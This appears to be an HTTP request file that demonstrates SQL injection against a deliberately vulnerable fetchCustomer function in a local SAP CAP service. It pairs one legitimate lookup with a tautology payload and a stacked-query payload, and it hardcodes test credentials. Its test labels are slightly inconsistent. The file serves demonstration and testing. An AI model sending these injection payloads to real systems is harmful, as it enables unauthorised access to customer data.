@server=http://localhost:4004
@username=incident.support@tester.sap.com
@password=initial

### ðŸ”’ SQL INJECTION VULNERABILITY DEMO
# =====================================================
# VULNERABLE: Custom fetchCustomer OData Function
# This demonstrates SQL injection in CAP services
# The function uses direct string interpolation in services.js
# =====================================================

### @name fetchCustomer_Legitimate
### âœ… Test 1: Legitimate customer lookup
### Expected: Returns 1 customer (Daniel Watts)
GET  {{server}}/odata/v4/admin/fetchCustomer
Content-Type: application/json
Authorization: Basic {{username}}:{{password}}

{
  "customerID": "1004100"
}

### @name fetchCustomer_SQLInjection_Tautology
### ðŸš¨ Test 3: SQL Injection - Tautology Attack
### Payload: ' OR '1'='1  (Always true condition)
### Expected: Returns ALL customers (VULNERABILITY!)
GET  {{server}}/odata/v4/admin/fetchCustomer
Content-Type: application/json
Authorization: Basic {{username}}:{{password}}

{
     "customerID": "1004100' OR '1'='1"
}


### @name fetchCustomer_SQLInjection_ multiple sql statements
### ðŸš¨ Test 3: SQL Injection -  multiple sql statements
### Payload: 'UNION SELECT * FROM Customers --"   (multiple sql statements)
### Expected: Returns empty array
GET  {{server}}/odata/v4/admin/fetchCustomer
Content-Type: application/json
Authorization: Basic {{username}}:{{password}}

{
     "customerID": "1004100'; SELECT * from sap_capire_incidents_Customers;-- "
}
